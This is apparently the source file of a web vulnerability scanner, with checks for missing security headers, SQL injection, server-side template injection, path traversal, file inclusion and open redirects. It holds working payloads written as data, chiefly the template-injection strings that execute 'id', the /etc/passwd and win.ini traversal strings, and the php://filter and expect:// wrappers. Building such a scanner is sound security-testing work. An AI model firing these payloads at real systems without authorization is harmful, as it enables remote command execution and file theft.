import type { CheckOutput, Exchange, ScanCheck, ScanCheckContext } from "./types";
import { compareResponses } from "../response-diff";
import { mutateParameter, parameterValue } from "./parameters";
export const h = (x: Exchange, name: string) =>
  Object.entries(x.response?.responseHeaders ?? {}).find(([k]) => k.toLowerCase() === name)?.[1] ??
  "";
export const text = (x: Exchange) => x.response?.responseBody ?? "";
export const ok = (x: Exchange) => !!x.response && !x.evidence.error && !x.evidence.truncated;
export const result = (message: string, inconclusive = false): CheckOutput => ({
  findings: [],
  message,
  inconclusive,
});
export function observation(
  title: string,
  summary: string,
  exchanges: Exchange[],
  excerpts: string[],
  severity: "info" | "low" | "medium" | "high" = "low",
): CheckOutput {
  return {
    message: "Evidence recorded; review application context.",
    findings: [
      {
        title,
        summary,
        severity,
        confidence: "medium",
        status: "needs_review",
        evidenceIds: exchanges.map((x) => x.evidence.id),
        excerpts: excerpts.map((s) => s.slice(0, 4000)),
        verification: {
          method: "captured evidence and differential controls",
          outcome: "inconclusive",
          reason:
            "The observed behavior requires contextual validation; exploit impact is not established.",
        },
        remediation: "Review the evidence and enforce the intended server-side policy.",
      },
    ],
  };
}
function cspPolicies(header: string) {
  return header
    .split(",")
    .filter((p) => p.trim())
    .map((policy) => {
      const directives = new Map<string, string[]>();
      for (const segment of policy.split(";")) {
        const [name, ...sources] = segment.trim().split(/\s+/);
        if (name && !directives.has(name.toLowerCase()))
          directives.set(name.toLowerCase(), sources);
      }
      return directives;
    });
}
export const passiveAudit: ScanCheck = {
  id: "passive-audit",
  name: "Headers, transport and disclosure audit",
  active: false,
  perParameter: false,
  async run(ctx) {
    const x = ctx.baselines[0]!;
    if (!x.response) return result("No captured response.", true);
    const findings: CheckOutput["findings"] = [];
    const add = (
      title: string,
      summary: string,
      excerpts: string[],
      severity: "info" | "low" | "medium" = "low",
    ) => findings.push(...observation(title, summary, [x], excerpts, severity).findings);
    const html = h(x, "content-type").toLowerCase().includes("text/html");
    const https = new URL(ctx.request.url).protocol === "https:";
    if (html && x.response.status >= 200 && x.response.status < 300) {
      if (!h(x, "content-security-policy"))
        add(
          "HTML response lacks Content-Security-Policy",
          "No enforced CSP header was observed. This alone does not establish XSS.",
          ["Content-Security-Policy: <absent>"],
        );
      const csp = h(x, "content-security-policy");
      const policies = cspPolicies(csp);
      const framing = policies
        .map((p) => p.get("frame-ancestors"))
        .filter((p): p is string[] => p !== undefined);
      const restrictedFraming = framing.some(
        (sources) => !sources.some((s) => s === "*" || /^(?:https?|\*):$/i.test(s)),
      );
      const xfo = /^(?:DENY|SAMEORIGIN)$/i.test(h(x, "x-frame-options").trim());
      if (!restrictedFraming && (framing.length > 0 || !xfo)) {
        add(
          csp
            ? "Content security policy: allows clickjacking"
            : "HTML response has no observed framing restriction",
          "No effective restrictive frame-ancestors policy or applicable X-Frame-Options was observed. default-src does not provide a frame-ancestors fallback. Sensitive page actions and browser framing behavior require review; clickjacking is not demonstrated.",
          [
            csp ? `Content-Security-Policy: ${csp}` : "Content-Security-Policy: <absent>",
            `X-Frame-Options: ${h(x, "x-frame-options") || "<absent>"}`,
          ],
          "info",
        );
      }
      const inlineStyles = (kind: "style-src-elem" | "style-src-attr") =>
        policies.length > 0 &&
        policies.every((policy) => {
          const sources = policy.get(kind) ?? policy.get("style-src") ?? policy.get("default-src");
          return (
            !sources ||
            (sources.includes("'unsafe-inline'") &&
              !sources.some((s) => /^'(?:nonce-|sha(?:256|384|512)-)/i.test(s)))
          );
        });
      const styleKinds = (["style-src-elem", "style-src-attr"] as const).filter(inlineStyles);
      if (styleKinds.length) {
        add(
          "Content security policy: allows untrusted style execution",
          "The enforced CSP allows arbitrary inline styles for " +
            styleKinds.join(", ") +
            ". Style injection requires an attacker-controlled injection point; this policy weakness alone does not establish XSS.",
          [`Content-Security-Policy: ${csp}`],
          "info",
        );
        findings[findings.length - 1]!.remediation =
          "Restrict style-src/style-src-elem/style-src-attr, remove unsafe-inline, and use nonces or hashes where appropriate.";
      }
      if (https && !h(x, "strict-transport-security"))
        add(
          "HTTPS document lacks Strict-Transport-Security",
          "HSTS was not advertised on this response; preload and parent-domain policy are not assessed.",
          ["Strict-Transport-Security: <absent>"],
        );
      if (/\b(?:src|href)\s*=\s*["']http:\/\//i.test(text(x)) && https)
        add(
          "HTTP resource references in HTTPS document",
          "A resource-like attribute references HTTP; browser handling and resource type require review.",
          ["HTTP src/href reference observed"],
        );
    }
    if (!h(x, "content-type") && text(x))
      add("Response lacks Content-Type", "A nonempty response has no Content-Type header.", [
        "Content-Type: <absent>",
      ]);
    const query = new URL(ctx.request.url).searchParams;
    for (const key of new Set(query.keys()))
      if (/^(password|passwd|pwd|access_token|auth_token|token|api_key|jwt)$/i.test(key))
        add(
          "Credential-like parameter in URL",
          "URLs may be retained in logs and browser history. Values are masked in excerpts.",
          [key + "=[REDACTED]"],
          "medium",
        );
    if (
      !https &&
      (Object.keys(ctx.request.headers).some((k) =>
        /^(authorization|cookie|x-api-key)$/i.test(k),
      ) ||
        /(?:password|passwd|pwd)["']?\s*[:=]/i.test(ctx.request.body))
    )
      add(
        "Credentials submitted over cleartext HTTP",
        "Credential-like request data was observed over HTTP.",
        ["Transport: HTTP; credential values redacted"],
        "medium",
      );
    if (/-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----/.test(text(x)))
      add(
        "Private key material in response",
        "A private-key PEM marker was observed. Example or test material must be ruled out.",
        ["Private key marker detected; value redacted"],
        "medium",
      );
    if (/<title>Index of\s|<h1>Index of\s/i.test(text(x)))
      add(
        "Possible directory listing",
        "The response matches a directory-index heading; verify exposed files.",
        ["Directory-index heading observed"],
        "info",
      );
    if (/(?:"openapi"\s*:\s*"3\.|"swagger"\s*:\s*"2\.)/.test(text(x)))
      add(
        "OpenAPI definition observed",
        "An API definition signature is present; publication may be intentional.",
        ["OpenAPI/Swagger version marker"],
        "info",
      );
    return {
      findings,
      message: "Passive request/response audit completed; no requests sent.",
      inconclusive: x.evidence.truncated,
    };
  },
};
export const sqlError =
  /SQLSTATE\[[A-Z0-9]{5}\]|You have an error in your SQL syntax|unclosed quotation mark|unterminated quoted string|ORA-01756|SQLite.*(?:syntax|error)|PostgreSQL.*ERROR/i;
// Mask only the selected HTML form field; preserve all other response content.
function sqlComparable(ctx: ScanCheckContext, x: Exchange, replacement: string) {
  const response = { ...x.response! };
  if (!ctx.parameter || ctx.parameter.kind !== "query") return response;
  const name = ctx.parameter.name;
  response.responseBody = response.responseBody.replace(/<input\b[^>]*>/gi, (tag) => {
    const field = /\bname\s*=\s*(["'])(.*?)\1/i.exec(tag);
    if (field?.[2] !== name) return tag;
    return tag.replace(
      /\bvalue\s*=\s*(["'])(.*?)\1/i,
      (_all, quote: string) => `value=${quote}${replacement}${quote}`,
    );
  });
  return response;
}
export async function sqlBooleanDifferential(ctx: ScanCheckContext): Promise<CheckOutput> {
  if (
    !ctx.parameter ||
    !ctx.stable ||
    ctx.baselines.length < 2 ||
    !ctx.baselines.every((x) => ok(x) && x.response!.status >= 200 && x.response!.status < 300)
  )
    return result("Stable baselines required for boolean comparison.", true);
  const rows: Exchange[] = [];
  // Two independent predicates, reversed order, plus a repeated pair.
  for (const [predicate, label] of [
    ["7=7", "true"],
    ["7=8", "false"],
    ["9=8", "false"],
    ["9=9", "true"],
    ["7=8", "false repeat"],
    ["7=7", "true repeat"],
  ])
    rows.push(
      await ctx.probe(
        mutateParameter(ctx.request, ctx.parameter, `0 OR ${predicate}`),
        `SQL boolean ${label}`,
      ),
    );
  const restored = await ctx.probe(ctx.request, "SQL boolean original control");
  if (
    ![...rows, restored].every(
      (x) => ok(x) && x.response!.status >= 200 && x.response!.status < 300,
    )
  )
    return result("Incomplete successful boolean SQL evidence.", true);
  const same = (a: Exchange, b: Exchange) => {
    const diff = compareResponses(
      sqlComparable(ctx, a, "<selected>"),
      sqlComparable(ctx, b, "<selected>"),
      ctx.diffOptions,
    );
    return !diff.statusChanged && !diff.bodyChanged;
  };
  if (
    same(rows[0]!, rows[3]!) &&
    same(rows[0]!, rows[5]!) &&
    same(rows[1]!, rows[2]!) &&
    same(rows[1]!, rows[4]!) &&
    !same(rows[0]!, rows[1]!) &&
    same(restored, ctx.baselines[0]!)
  ) {
    return observation(
      "Possible SQL injection: repeated boolean differential",
      "Two independent true/false predicates repeatedly produced distinct response groups; the original request restored the baseline. Only the selected HTML input value was masked during comparison. Application logic can mimic this behavior; SQL execution requires review.",
      [...ctx.baselines, ...rows, restored],
      ["0 OR 7=7 / 0 OR 7=8; 0 OR 9=9 / 0 OR 9=8; repeated pair and original control"],
      "medium",
    );
  }
  return result("No repeatable controlled SQL boolean differential.");
}
async function sqlQuoteRepair(ctx: ScanCheckContext): Promise<CheckOutput> {
  const success = (x: Exchange) => ok(x) && x.response!.status >= 200 && x.response!.status < 300;
  if (!ctx.parameter || !ctx.stable || ctx.baselines.length < 2 || !ctx.baselines.every(success))
    return result("Quote-repair comparison requires stable successful baselines.", true);
  const same = (a: Exchange, b: Exchange) => {
    const diff = compareResponses(
      sqlComparable(ctx, a, "<selected>"),
      sqlComparable(ctx, b, "<selected>"),
      ctx.diffOptions,
    );
    return !diff.statusChanged && !diff.bodyChanged;
  };
  const value = parameterValue(ctx.request, ctx.parameter);
  const rows: Exchange[] = [];
  for (const [suffix, label] of [
    ["'", "SQL single quote"],
    ["''", "SQL doubled-quote repair"],
    ["''", "SQL doubled-quote repeat"],
    ["'", "SQL single-quote repeat"],
  ])
    rows.push(await ctx.probe(mutateParameter(ctx.request, ctx.parameter, value + suffix), label!));
  const restored = await ctx.probe(ctx.request, "SQL quote-repair original control");
  if (![...rows, restored].every(ok)) return result("Incomplete quote-repair evidence.", true);
  const [broken, repaired, repairedAgain, brokenAgain] = rows as [
    Exchange,
    Exchange,
    Exchange,
    Exchange,
  ];
  if (
    [broken, brokenAgain].every((x) => x.response!.status >= 500) &&
    [repaired, repairedAgain, restored].every((x) => success(x) && same(x, ctx.baselines[0]!)) &&
    same(broken, brokenAgain) &&
    !same(broken, repaired)
  ) {
    const output = observation(
      "Possible SQL injection: repeated quote-repair differential",
      "Single quotes repeatedly caused server errors; doubled SQL-style quotes restored the baseline response twice, as did the original request. No database error text was required. Syntax-sensitive application validation can mimic this pattern; SQL execution is not proven.",
      [...ctx.baselines, ...rows, restored],
      [
        "Single/doubled/doubled/single ordering; status and normalized body compared; original restored",
      ],
      "medium",
    );
    output.findings[0]!.verification.method =
      "Repeated quote break/repair and original-response comparison";
    output.findings[0]!.remediation =
      "Use parameterized SQL values and explicit allowlists for SQL identifiers; do not rely on quote filtering.";
    return output;
  }
  return result("No repeatable database error or controlled quote-repair differential.");
}
export const sqlInjection: ScanCheck = {
  id: "sql-injection",
  name: "SQL injection — error, quote-repair and boolean differentials",
  active: true,
  perParameter: true,
  async run(ctx) {
    if (!ctx.stable || !ctx.parameter)
      return result("Stable baselines and selected parameter required.", true);
    if (ctx.baselines.some((x) => sqlError.test(text(x))))
      return result("Baseline already contains SQL error signatures.", true);
    const control = await ctx.probe(
      mutateParameter(ctx.request, ctx.parameter, ctx.nonce()),
      "SQL benign control",
    );
    const a = await ctx.probe(
      mutateParameter(ctx.request, ctx.parameter, "'\""),
      "SQL quote probe",
    );
    const b = await ctx.probe(
      mutateParameter(ctx.request, ctx.parameter, "'\""),
      "SQL quote repeat",
    );
    const restore = await ctx.probe(ctx.request, "SQL original control");
    if (![control, a, b, restore].every(ok))
      return result("Incomplete SQL differential evidence.", true);
    if (
      !sqlError.test(text(a)) ||
      !sqlError.test(text(b)) ||
      sqlError.test(text(control)) ||
      sqlError.test(text(restore))
    ) {
      const repaired = await sqlQuoteRepair(ctx);
      return repaired.findings.length ? repaired : sqlBooleanDifferential(ctx);
    }
    return observation(
      "Possible SQL injection: repeatable database errors",
      "Quote probes produced database errors absent from benign and original controls. Database errors alone do not prove SQL execution.",
      [control, a, b, restore],
      [text(a).match(sqlError)![0]],
      "medium",
    );
  },
};
async function templateFingerprint(ctx: ScanCheckContext): Promise<string | undefined> {
  if (!ctx.parameter) return undefined;
  const prefix = ctx.nonce();
  const suffix = ctx.nonce();
  const probe = await ctx.probe(
    mutateParameter(ctx.request, ctx.parameter, `${prefix}{{7*'7'}}${suffix}`),
    "Template engine fingerprint",
  );
  if (!ok(probe)) return undefined;
  const body = text(probe);
  if (body.includes(`${prefix}7777777${suffix}`)) return "Jinja2";
  if (body.includes(`${prefix}49${suffix}`)) return "Twig/Nunjucks";
  return undefined;
}

const templateError =
  /jinja2\.exceptions|TemplateSyntaxError|Twig\\?Error|freemarker\.core|FreeMarker template error|org\.thymeleaf|thymeleaf\.exceptions|Liquid error|ERB syntax|ParseError[^\n]*template/i;

export const ssti: ScanCheck = {
  id: "ssti",
  name: "Server-side template arithmetic",
  active: true,
  perParameter: true,
  async run(ctx) {
    if (!ctx.stable || !ctx.parameter)
      return result("Stable baselines and selected parameter required.", true);
    const responses: Exchange[] = [];
    let evaluated = true;
    for (const [a, b] of [
      [137, 149],
      [157, 163],
    ] as const) {
      const prefix = ctx.nonce(),
        suffix = ctx.nonce();
      const expected = prefix + a * b + suffix;
      const probe = await ctx.probe(
        mutateParameter(ctx.request, ctx.parameter, `${prefix}{{${a}*${b}}}${suffix}`),
        "Template arithmetic probe",
      );
      const control = await ctx.probe(
        mutateParameter(ctx.request, ctx.parameter, `${prefix}{{${a}x${b}}}${suffix}`),
        "Template syntax control",
      );
      if (!ok(probe) || !ok(control)) return result("Incomplete template evidence.", true);
      if (!text(probe).includes(expected) || text(control).includes(expected)) {
        evaluated = false;
        break;
      }
      responses.push(probe, control);
    }
    if (evaluated) {
      const engine = await templateFingerprint(ctx);
      return observation(
        "Possible server-side template evaluation",
        "Two arithmetic expressions were evaluated between unique markers while invalid-expression controls were not. Confirm template context and impact.",
        responses,
        [
          "Two independent marked arithmetic results observed",
          ...(engine ? [`Engine fingerprint: ${engine}`] : []),
        ],
        "high",
      );
    }

    // Other engine syntaxes, still arithmetic-only and non-intrusive.
    for (const [open, close, label] of [
      ["${", "}", "Freemarker/JSP EL"],
      ["#{", "}", "Ruby/Thymeleaf"],
      ["<%=", "%>", "ERB/EJS"],
      ["*{", "}", "Thymeleaf"],
      ["@(", ")", "Razor"],
    ] as const) {
      const a = 137;
      const b = 149;
      const prefix = ctx.nonce();
      const suffix = ctx.nonce();
      const expected = prefix + a * b + suffix;
      const probe = await ctx.probe(
        mutateParameter(ctx.request, ctx.parameter, `${prefix}${open}${a}*${b}${close}${suffix}`),
        `Template ${label} arithmetic probe`,
      );
      const control = await ctx.probe(
        mutateParameter(ctx.request, ctx.parameter, `${prefix}${open}${a}x${b}${close}${suffix}`),
        `Template ${label} syntax control`,
      );
      if (!ok(probe) || !ok(control)) return result("Incomplete template evidence.", true);
      if (text(probe).includes(expected) && !text(control).includes(expected)) {
        const engine = await templateFingerprint(ctx);
        return observation(
          `Possible server-side template evaluation: ${label} syntax`,
          "An arithmetic expression in an engine-specific syntax was evaluated between unique markers while the invalid-expression control was not. This identifies the template syntax family; confirm the engine and impact.",
          [probe, control],
          [
            `Evaluated syntax: ${open}...${close}`,
            ...(engine ? [`Engine fingerprint: ${engine}`] : []),
          ],
          "high",
        );
      }
    }

    // Polyglot is used only as a parser/error probe, never as an execution payload.
    const marker = ctx.nonce();
    const polyglot = "${{<%[%'\"}}%\\";
    const probe = await ctx.probe(
      mutateParameter(ctx.request, ctx.parameter, `${marker}${polyglot}${marker}`),
      "Template polyglot parser probe",
    );
    const control = await ctx.probe(
      mutateParameter(ctx.request, ctx.parameter, marker),
      "Template polyglot control",
    );
    if (ok(probe) && ok(control) && templateError.test(text(probe)) && !templateError.test(text(control)))
      return observation(
        "Template engine error disclosed by a polyglot probe",
        "A parser polyglot produced a template-engine error that a plain marker did not. This is engine/error disclosure, not proof of evaluation; confirm with arithmetic probes.",
        [control, probe],
        ["Polyglot payload caused a template parser error"],
        "low",
      );
    return result("No controlled template arithmetic evaluation observed.");
  },
};

export const sstiRce: ScanCheck = {
  id: "ssti-rce",
  name: "SSTI — engine proof-of-concept (benign id)",
  active: true,
  perParameter: true,
  async run(ctx) {
    if (!ctx.stable || !ctx.parameter)
      return result("Stable baselines and selected parameter required.", true);
    const uid = /(?:^|\n)uid=\d+\([^)]*\) gid=\d+\(/;
    if (ctx.baselines.some((x) => uid.test(text(x))))
      return result("Baseline already contains command-output signatures.", true);
    const controlValue = `slurp_${ctx.nonce().replace(/[^a-zA-Z0-9]/g, "")}`;
    const payloads = [
      {
        engine: "Jinja2",
        payload: "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
      },
      {
        engine: "Twig",
        payload:
          '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
      },
      {
        engine: "Freemarker",
        payload: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
      },
      { engine: "ERB/EJS", payload: '<%= system("id") %>' },
      {
        engine: "Thymeleaf",
        payload: '__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x',
      },
    ];
    for (const { engine, payload } of payloads) {
      const probe = await ctx.probe(
        mutateParameter(ctx.request, ctx.parameter, payload),
        `${engine} template command probe`,
      );
      const repeat = await ctx.probe(
        mutateParameter(ctx.request, ctx.parameter, payload),
        `${engine} template command repeat`,
      );
      const control = await ctx.probe(
        mutateParameter(ctx.request, ctx.parameter, controlValue),
        `${engine} benign control`,
      );
      if (![probe, repeat, control].every(ok))
        return result("Incomplete template command evidence.", true);
      if (uid.test(text(probe)) && uid.test(text(repeat)) && !uid.test(text(control)))
        return observation(
          `Server-side template injection: ${engine} executed a benign command`,
          "The engine proof-of-concept payload returned the output of `id` twice while a benign value and the baseline did not. Only `id` was executed; no shell, file read or data change was performed, and template context still requires review.",
          [...ctx.baselines, probe, repeat, control],
          [`Payload: ${payload}`, "uid/gid command output reproduced twice"],
          "high",
        );
    }
    return result("No benign command output observed for the supported engine payloads.");
  },
};

export const traversal: ScanCheck = {
  id: "path-traversal",
  name: "File path traversal — content signatures",
  active: true,
  perParameter: true,
  async run(ctx) {
    if (!ctx.stable || !ctx.parameter)
      return result("Stable baselines and selected parameter required.", true);
    const signature =
      /(?:^|\n)root:[^:\n]*:0:0:[^\n]*:[^\n]*\/[^\n]*|\[extensions\][\s\S]{0,500}\[fonts\]|\[fonts\][\s\S]{0,500}\[(?:extensions|mci extensions)\]|# Copyright \(c\) 1993-2009 Microsoft Corp\./i;
    if (ctx.baselines.some((x) => signature.test(text(x))))
      return result("Baseline already contains file signatures.", true);
    for (const payload of [
      "../../../../../../etc/passwd",
      "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
      "%2e%2e%2f".repeat(6) + "etc%2fpasswd",
      "....//....//....//....//etc/passwd",
      "%252e%252e%252f".repeat(6) + "etc%252fpasswd",
      "..\\..\\..\\..\\Windows\\win.ini",
      "..\\..\\Windows\\System32\\drivers\\etc\\hosts",
      "C:\\Windows\\System32\\drivers\\etc\\hosts",
      "\\\\?\\C:\\Windows\\win.ini",
      "/etc/passwd\u0000.png",
      "..;/..;/..;/etc/passwd",
      "%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
      "%uff0e%uff0e/%uff0e%uff0e/etc/passwd",
      "../../../../../../etc/passwd/.",
    ]) {
      const probe = await ctx.probe(
        mutateParameter(ctx.request, ctx.parameter, payload),
        "Traversal content probe",
      );
      const repeat = await ctx.probe(
        mutateParameter(ctx.request, ctx.parameter, payload),
        "Traversal repeat",
      );
      const control = await ctx.probe(
        mutateParameter(ctx.request, ctx.parameter, "slurp-missing-" + ctx.nonce()),
        "Missing-file control",
      );
      if (![probe, repeat, control].every(ok))
        return result("Incomplete traversal evidence.", true);
      if (
        signature.test(text(probe)) &&
        signature.test(text(repeat)) &&
        !signature.test(text(control))
      )
        return observation(
          "Possible path traversal: system-file signature returned",
          "Repeated traversal values returned recognizable system-file content absent from baselines and a missing-file control. Confirm file source and intended permissions.",
          [...ctx.baselines, probe, repeat, control],
          ["Payload: " + payload, "System-file signature observed; inspect local evidence"],
          "high",
        );
    }
    return result("No controlled system-file disclosure observed for supported payloads.");
  },
};
export const fileInclusion: ScanCheck = {
  id: "file-inclusion",
  name: "Local/remote file inclusion — wrappers and resource signatures",
  active: true,
  perParameter: true,
  async run(ctx) {
    if (!ctx.stable || !ctx.parameter)
      return result("Stable baselines and selected parameter required.", true);
    const root = /(?:^|\n)root:[^:\n]*:0:0:[^\n]*/;
    const uid = /(?:^|\n)uid=\d+\([^)]*\)/;
    const marker = ctx.nonce();
    const decodedRoot = (body: string) =>
      (body.match(/[A-Za-z0-9+/]{40,}={0,2}/g) ?? []).some((value) => {
        try {
          return root.test(atob(value));
        } catch {
          return false;
        }
      });
    const leaked = (body: string) =>
      root.test(body) || decodedRoot(body) || body.includes(marker) || uid.test(body);
    if (ctx.baselines.some((x) => leaked(text(x)) || text(x).includes("Example Domain")))
      return result("Baseline already contains file, command or remote-content signatures.", true);
    for (const payload of [
      "php://filter/convert.base64-encode/resource=/etc/passwd",
      "php://filter/read=convert.base64-encode/resource=/etc/passwd",
      "file:///etc/passwd",
      "/etc/passwd",
      `data://text/plain;base64,${btoa(marker)}`,
      "expect://id",
      "http://example.com/",
    ]) {
      const probe = await ctx.probe(
        mutateParameter(ctx.request, ctx.parameter, payload),
        "File inclusion probe",
      );
      const repeat = await ctx.probe(
        mutateParameter(ctx.request, ctx.parameter, payload),
        "File inclusion repeat",
      );
      const control = await ctx.probe(
        mutateParameter(
          ctx.request,
          ctx.parameter,
          "php://filter/convert.base64-encode/resource=/slurp-missing-" + ctx.nonce(),
        ),
        "Missing-resource control",
      );
      if (![probe, repeat, control].every(ok))
        return result("Incomplete file-inclusion evidence.", true);
      const matched = (body: string) =>
        leaked(body) || (payload === "http://example.com/" && body.includes("Example Domain"));
      if (
        matched(text(probe)) &&
        matched(text(repeat)) &&
        !matched(text(control))
      )
        return observation(
          "Possible local/remote file inclusion: wrapper or resource content returned",
          "Repeated inclusion values returned system-file content, a decodable base64-encoded copy, or the decoded data-wrapper marker, while baselines and a missing-resource control did not. Confirm which resource was included and whether the parameter is meant to accept a path or URL.",
          [...ctx.baselines, probe, repeat, control],
          [
            "Payload: " + payload,
            leaked(text(probe)) && marker && text(probe).includes(marker)
              ? "Data-wrapper marker executed"
              : "System-file signature or decodable copy observed",
          ],
          "high",
        );
    }
    return result("No controlled file-inclusion evidence for supported wrappers and resources.");
  },
};
export const openRedirect: ScanCheck = {
  id: "open-redirect",
  name: "Open redirect — absolute / protocol-relative",
  active: true,
  perParameter: true,
  async run(ctx) {
    if (!ctx.parameter) return result("Select a redirect parameter.", true);
    for (const protocolRelative of [false, true]) {
      const responses: Exchange[] = [];
      for (let i = 0; i < 2; i++) {
        const host = ctx.nonce().toLowerCase() + ".invalid";
        const destination = (protocolRelative ? "//" : "https://") + host + "/";
        const probe = await ctx.probe(
          mutateParameter(ctx.request, ctx.parameter, destination),
          "Redirect destination probe",
        );
        if (!ok(probe)) return result("Incomplete redirect evidence.", true);
        let target: URL;
        try {
          target = new URL(h(probe, "location"), ctx.request.url);
        } catch {
          break;
        }
        if (
          ![301, 302, 303, 307, 308].includes(probe.response!.status) ||
          target.hostname !== host ||
          !["https:", "http:"].includes(target.protocol)
        )
          break;
        responses.push(probe);
      }
      if (responses.length === 2)
        return observation(
          "External redirect controlled by input",
          "Two distinct supplied destinations appeared in redirect Location headers. Absolute and protocol-relative URL forms are supported. Redirects were not followed. Assess whether external navigation is intended.",
          responses,
          responses.map((x) => "Location: " + h(x, "location")),
          "medium",
        );
    }
    const origin = new URL(ctx.request.url);
    const attackerHost = (nonce: string) => `${nonce.toLowerCase()}.invalid`;
    const bypasses = [
      (host: string) => `https://${origin.hostname}@${host}/`,
      (host: string) => `https://${origin.hostname}.${host}/`,
      (host: string) => `https:%2f%2f${host}/`,
      (host: string) => `%2f%2f${host}/`,
      (host: string) => `//${host}/%2f..`,
      (host: string) => `/\\${host}/`,
    ];
    for (const make of bypasses) {
      const host = attackerHost(ctx.nonce());
      const value = make(host);
      const rows: Exchange[] = [];
      for (let i = 0; i < 2; i++) {
        const probe = await ctx.probe(
          mutateParameter(ctx.request, ctx.parameter, value),
          "Redirect bypass probe",
        );
        if (!ok(probe) || ![301, 302, 303, 307, 308].includes(probe.response!.status)) break;
        let target: URL;
        try {
          target = new URL(h(probe, "location"), ctx.request.url);
        } catch {
          break;
        }
        if (
          target.hostname !== host ||
          !["https:", "http:"].includes(target.protocol)
        )
          break;
        rows.push(probe);
      }
      if (rows.length === 2)
        return observation(
          "Open redirect bypass accepted",
          "A crafted redirect value containing the legitimate host resolved to the attacker host twice in the Location header. Prefix, suffix, encoded-slash, protocol-relative and backslash normalization forms were tested; the redirect was not followed.",
          rows,
          [`Payload: ${value}`, `Resolved host: ${host}`],
          "medium",
        );
    }
    for (let i = 0; i < 2; i++) {
      const probe = await ctx.probe(
        mutateParameter(ctx.request, ctx.parameter, "javascript:alert(1)"),
        "Redirect javascript scheme probe",
      );
      if (!ok(probe) || ![301, 302, 303, 307, 308].includes(probe.response!.status)) break;
      let target: URL;
      try {
        target = new URL(h(probe, "location"), ctx.request.url);
      } catch {
        break;
      }
      if (target.protocol !== "javascript:") break;
      if (i === 1)
        return observation(
          "Redirect to a javascript: URI",
          "Two redirect responses placed a javascript: URI in Location for a supplied parameter. If a client follows that Location, script executes in the redirecting origin; the payload was not executed by this check.",
          [probe],
          ["Location uses the javascript: scheme"],
          "high",
        );
    }
    return result("No external redirect to both independent destinations for supported URL forms.");
  },
};
export const extendedChecks = [passiveAudit, sqlInjection, ssti, sstiRce, traversal, fileInclusion, openRedirect];